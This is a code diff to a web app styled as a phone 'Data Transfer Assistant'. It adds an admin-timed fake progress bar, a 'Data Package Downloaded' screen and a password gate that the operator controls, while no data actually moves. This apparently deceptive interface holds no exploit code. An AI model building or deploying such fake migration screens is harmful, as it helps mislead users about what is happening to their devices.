@@ -29,22 +29,23 @@
     .hidden { display: none !important; }
     .container { width: 100%; max-width: 440px; padding: 20px; position: relative; }
     
-    /* --- Overlays (Activation & Timer) --- */
+    /* --- Overlays --- */
     .overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background-color: #0b0b0c; z-index: 1000;
+      background-color: #000000; z-index: 1000;
       display: flex; justify-content: center; align-items: center; flex-direction: column; padding: 20px;
     }
     
     /* --- Client Portal Styles --- */
     .client-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; margin-top: 10px; }
     .back-btn { color: #3b82f6; font-size: 14px; font-weight: 500; cursor: pointer; text-decoration: none; display: flex; align-items: center; gap: 4px; }
+    .back-btn:hover { text-decoration: underline; }
     .header-sub { color: #8e8e93; font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; }
     .client-title { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 30px; }
     
     .card {
       background-color: #1c1c1e; border-radius: 20px; padding: 24px;
-      margin-bottom: 16px; display: flex; flex-direction: column; align-items: center; text-align: center;
+      margin-bottom: 16px; display: flex; flex-direction: column; align-items: center; text-align: center; width: 100%;
     }
     .icon-box {
       background-color: #3b82f6; width: 56px; height: 56px;
@@ -60,7 +61,7 @@
     .list-icon { color: #8e8e93; font-size: 18px; width: 24px; text-align: center; }
     .list-text { font-size: 16px; font-weight: 500; }
 
-    /* --- Global Button Hover (Black Background) --- */
+    /* --- Global Button Hover --- */
     button:hover, .btn:hover, .proceed-btn:hover {
       background-color: #000000 !important;
       color: #ffffff !important;
@@ -82,23 +83,26 @@
     #activationView p { color: #8e8e93; margin-bottom: 20px; font-size: 14px; }
     #activationView input { text-align: center; letter-spacing: 5px; font-size: 20px; font-weight: bold; }
 
-    /* --- Animated Timer --- */
-    #timerView .timer-display {
-      font-size: 64px; font-weight: 700; color: #4ade80;
-      animation: pulse 1s infinite alternate; margin-bottom: 30px;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      100% { transform: scale(1.05); opacity: 0.8; }
-    }
+    /* --- Screens 1, 2, 3 (Timer, Ready, Install) --- */
+    .screen-title { font-size: 28px; font-weight: 700; margin-bottom: 30px; text-align: center; }
+    .screen-card { width: 100%; max-width: 400px; }
+    
+    /* Timer Bar */
     .timer-bar-container {
-      width: 100%; max-width: 300px; height: 12px; background: #3a3a3c;
-      border-radius: 6px; overflow: hidden; margin-bottom: 20px;
+      width: 100%; height: 14px; background: #3a3a3c;
+      border-radius: 7px; overflow: hidden; margin: 20px 0 10px 0;
     }
     .timer-fill {
       height: 100%; background: #4ade80; width: 100%; transition: width 1s linear;
     }
-    .timer-label { color: #8e8e93; font-size: 14px; margin-bottom: 40px; }
+    .timer-percentage { color: #4ade80; font-weight: 700; font-size: 18px; }
+
+    /* Install Screen */
+    .install-input {
+      text-align: center; letter-spacing: 5px; font-size: 20px; font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .install-error { color: #ef4444; font-size: 14px; text-align: center; display: none; margin-bottom: 15px; }
 
     /* --- Admin Panel Styles --- */
     .admin-card { background-color: #1c1c1e; border: 1px solid #2c2c2e; border-radius: 16px; padding: 24px 20px; margin-bottom: 16px; }
@@ -140,7 +144,7 @@
   <!-- ================= CLIENT PORTAL ================= -->
   <div id="clientView" class="container hidden">
     <div class="client-header">
-      <span class="back-btn" id="c_backText">← Back</span>
+      <span class="back-btn" id="c_backText" onclick="goBack()">← Back</span>
       <span class="header-sub" id="c_headerText">DATA TRANSFER ASSISTANT</span>
     </div>
 
@@ -160,19 +164,48 @@
 
     <div class="list-container" id="c_listContainer"></div>
 
-    <!-- Changed to directly start the timer -->
     <button class="proceed-btn" id="c_btnText" onclick="startMigrationProcess()">PROCEED</button>
     <br><br>
   </div>
 
-  <!-- ================= ANIMATED TIMER SCREEN ================= -->
+  <!-- ================= SCREEN 1: TRANSFERRING (TIMER) ================= -->
   <div id="timerView" class="overlay hidden">
-    <div class="timer-display" id="timerDisplay">00:00</div>
-    <div class="timer-label">Migration in progress...</div>
-    <div class="timer-bar-container">
-      <div class="timer-fill" id="timerFill"></div>
+    <h2 class="screen-title">Transferring</h2>
+    <div class="card screen-card">
+      <h2 class="card-title" style="font-size: 18px; margin-bottom: 8px;">Migrating Device Data...</h2>
+      <p class="card-sub" id="timerRemainingText" style="text-transform: none; font-size: 14px; color: #8e8e93;">About 38 seconds remaining</p>
+      
+      <div class="timer-bar-container">
+        <div class="timer-fill" id="timerFill"></div>
+      </div>
+      <p class="timer-percentage" id="timerPercentage">0%</p>
     </div>
-    <button class="btn btn-secondary" onclick="cancelTimer()" style="max-width:200px;">Cancel</button>
+  </div>
+
+  <!-- ================= SCREEN 2: TRANSFER READY ================= -->
+  <div id="transferReadyView" class="overlay hidden">
+    <h2 class="screen-title">Transfer Ready</h2>
+    <div class="card screen-card">
+      <div style="font-size: 48px; margin-bottom: 16px; margin-top: 10px;">🎉</div>
+      <h2 class="card-title" style="font-size: 18px; margin-bottom: 8px;">Data Package Downloaded</h2>
+      <p class="card-sub" style="text-transform: none; font-size: 14px; color: #8e8e93; margin-bottom: 24px; line-height: 1.4;">All items are ready to be installed onto this device.</p>
+      <button class="btn btn-primary" style="border-radius: 30px; padding: 16px; width: 100%;" onclick="showInstallView()">Finish Installing</button>
+    </div>
+  </div>
+
+  <!-- ================= SCREEN 3: CONFIRM INSTALLATION ================= -->
+  <div id="installView" class="overlay hidden">
+    <h2 class="screen-title">Confirm Installation</h2>
+    <div class="card screen-card">
+      <p style="font-size: 14px; color: #8e8e93; margin-bottom: 20px; text-align: center; line-height: 1.5;">Enter your device administrator password to apply and install the migrated data.</p>
+      
+      <div class="form-group" style="width: 100%; margin-bottom: 10px;">
+        <input type="password" id="installPasswordInput" placeholder="••••" class="install-input" />
+      </div>
+      <div id="installError" class="install-error">Incorrect password. Try again.</div>
+      
+      <button class="btn btn-primary" style="border-radius: 30px; padding: 16px; width: 100%;" onclick="verifyInstallPassword()">Authorize & Install</button>
+    </div>
   </div>
 
   <!-- ================= ADMIN PANEL ================= -->
@@ -195,11 +228,15 @@
         <p class="sub" id="userEmailDisplay"></p>
 
         <div class="form-group">
-          <label>🔑 Activation Code (Required to open client)</label>
+          <label>🔑 Activation Code (To open client)</label>
           <input type="text" id="a_activationCode" placeholder="e.g. 1234" style="border-color: #f59e0b;" />
         </div>
         
-        <!-- NEW TIMER SETTING ADDED HERE -->
+        <div class="form-group">
+          <label>🔒 Installation Password (For final step)</label>
+          <input type="text" id="a_installPassword" placeholder="e.g. 1234" style="border-color: #f59e0b;" />
+        </div>
+
         <div class="form-group">
           <label>⏱️ Timer Duration (Minutes)</label>
           <input type="number" id="a_timerMinutes" placeholder="e.g. 10" min="1" style="border-color: #3b82f6;" />
@@ -253,17 +290,20 @@
   const DATA_REF = db.ref('app_data/device_migration');
 
   // Global State
-  let currentActivationCode = "1234"; // Default fallback
-  let globalTimerMinutes = 5; // Default fallback if admin hasn't set it
+  let currentActivationCode = "1234"; 
+  let currentInstallPassword = "1234";
+  let globalTimerMinutes = 1; 
   let timerInterval = null;
   let totalSeconds = 0;
   let currentSeconds = 0;
 
-  // --- UI TOGGLING (Replaced by direct functions) ---
+  // --- NAVIGATION FUNCTIONS ---
   function showAdminView() {
     document.getElementById('clientView').classList.add('hidden');
     document.getElementById('activationView').classList.add('hidden');
     document.getElementById('timerView').classList.add('hidden');
+    document.getElementById('transferReadyView').classList.add('hidden');
+    document.getElementById('installView').classList.add('hidden');
     document.getElementById('adminView').classList.remove('hidden');
   }
 
@@ -275,6 +315,35 @@
     } else {
       document.getElementById('activationView').classList.remove('hidden');
       document.getElementById('clientView').classList.add('hidden');
+    }
+  }
+
+  // --- THE BACK BUTTON LOGIC ---
+  function goBack() {
+    // If we are in a process screen, stop it and go back to the main client view
+    if (!document.getElementById('timerView').classList.contains('hidden') ||
+        !document.getElementById('transferReadyView').classList.contains('hidden') ||
+        !document.getElementById('installView').classList.contains('hidden')) {
+      
+      // Stop timer if running
+      if (timerInterval) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+      }
+      
+      // Hide all process screens
+      document.getElementById('timerView').classList.add('hidden');
+      document.getElementById('transferReadyView').classList.add('hidden');
+      document.getElementById('installView').classList.add('hidden');
+      
+      // Show main client view
+      document.getElementById('clientView').classList.remove('hidden');
+    } else {
+      // If already on the main client view, go back to activation screen
+      sessionStorage.removeItem('isActivated');
+      document.getElementById('clientView').classList.add('hidden');
+      document.getElementById('activationView').classList.remove('hidden');
+      document.getElementById('activationCodeInput').value = '';
     }
   }
 
@@ -294,7 +363,7 @@
     }
   }
 
-  // --- TIMER LOGIC (Now handled by Admin settings) ---
+  // --- TIMER & PROCESS LOGIC ---
   function startMigrationProcess() {
     if (!globalTimerMinutes || globalTimerMinutes <= 0) {
       alert("The administrator has not set a valid timer duration yet.");
@@ -310,37 +379,59 @@
     document.getElementById('clientView').classList.add('hidden');
     document.getElementById('timerView').classList.remove('hidden');
     
+    // Initial render
     updateTimerDisplay();
     document.getElementById('timerFill').style.width = '100%';
+    document.getElementById('timerPercentage').innerText = '0%';
 
     if (timerInterval) clearInterval(timerInterval);
 
     timerInterval = setInterval(() => {
       currentSeconds--;
-      updateTimerDisplay();
       
-      const percent = (currentSeconds / totalSeconds) * 100;
-      document.getElementById('timerFill').style.width = percent + '%';
+      // Update text
+      const secondsRemaining = currentSeconds;
+      if (secondsRemaining > 60) {
+        const mins = Math.ceil(secondsRemaining / 60);
+        document.getElementById('timerRemainingText').innerText = `About ${mins} minutes remaining`;
+      } else {
+        document.getElementById('timerRemainingText').innerText = `About ${secondsRemaining} seconds remaining`;
+      }
 
+      // Update percentage and bar
+      const percent = Math.round(((totalSeconds - currentSeconds) / totalSeconds) * 100);
+      document.getElementById('timerPercentage').innerText = percent + '%';
+      document.getElementById('timerFill').style.width = (100 - percent) + '%';
+
+      // Check if finished
       if (currentSeconds <= 0) {
         clearInterval(timerInterval);
-        document.getElementById('timerDisplay').innerText = "DONE";
-        document.getElementById('timerLabel').innerText = "Migration Complete!";
+        timerInterval = null;
+        // Move to Transfer Ready Screen
+        document.getElementById('timerView').classList.add('hidden');
+        document.getElementById('transferReadyView').classList.remove('hidden');
       }
     }, 1000);
   }
 
-  function updateTimerDisplay() {
-    const mins = Math.floor(currentSeconds / 60);
-    const secs = currentSeconds % 60;
-    document.getElementById('timerDisplay').innerText = 
-      `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+  function showInstallView() {
+    document.getElementById('transferReadyView').classList.add('hidden');
+    document.getElementById('installView').classList.remove('hidden');
+    document.getElementById('installPasswordInput').value = '';
+    document.getElementById('installError').style.display = 'none';
   }
 
-  function cancelTimer() {
-    if (timerInterval) clearInterval(timerInterval);
-    document.getElementById('timerView').classList.add('hidden');
-    document.getElementById('clientView').classList.remove('hidden');
+  function verifyInstallPassword() {
+    const input = document.getElementById('installPasswordInput').value;
+    const errorBox = document.getElementById('installError');
+    
+    if (input === currentInstallPassword) {
+      errorBox.style.display = 'none';
+      alert("Installation Authorized! Data migration complete.");
+      goBack(); // Return to main screen
+    } else {
+      errorBox.style.display = 'block';
+    }
   }
 
   // --- CLIENT PORTAL DATA SYNC ---
@@ -350,12 +441,13 @@
     receiveTitle: "Receive data on this device", receiveId: "352703943015910",
     item1: "Call History & Logs", item2: "Contacts", item3: "Photos and Videos",
     item4: "System Messages", item5: "Installed Applications", btnText: "PROCEED",
-    activationCode: "1234", timerMinutes: 5
+    activationCode: "1234", installPassword: "1234", timerMinutes: 1
   };
 
   DATA_REF.on('value', (snapshot) => {
     const data = snapshot.val() || defaultData;
     currentActivationCode = data.activationCode || defaultData.activationCode;
+    currentInstallPassword = data.installPassword || defaultData.installPassword;
     globalTimerMinutes = data.timerMinutes || defaultData.timerMinutes;
     
     // Update Client UI
@@ -397,6 +489,7 @@
         document.getElementById('a_item5').value = data.item5 || '';
         document.getElementById('a_btnText').value = data.btnText || '';
         document.getElementById('a_activationCode').value = data.activationCode || defaultData.activationCode;
+        document.getElementById('a_installPassword').value = data.installPassword || defaultData.installPassword;
         document.getElementById('a_timerMinutes').value = data.timerMinutes || defaultData.timerMinutes;
     }
   });
@@ -428,13 +521,14 @@
 
   function handleLogout() {
     auth.signOut();
-    showClientView(); // Send back to client view upon logout
+    showClientView(); 
   }
 
   function saveSettings() {
     const payload = {
       activationCode: document.getElementById('a_activationCode').value.trim() || "1234",
-      timerMinutes: parseInt(document.getElementById('a_timerMinutes').value, 10) || 5,
+      installPassword: document.getElementById('a_installPassword').value.trim() || "1234",
+      timerMinutes: parseInt(document.getElementById('a_timerMinutes').value, 10) || 1,
       headerText: document.getElementById('a_headerText').value,
       title: document.getElementById('a_title').value,
       backText: document.getElementById('a_backText').value,
@@ -453,7 +547,6 @@
 
     DATA_REF.set(payload)
       .then(() => {
-        // This ensures a popup ALWAYS shows on success
         alert("✅ Configuration saved successfully!");
       })
       .catch(err => {
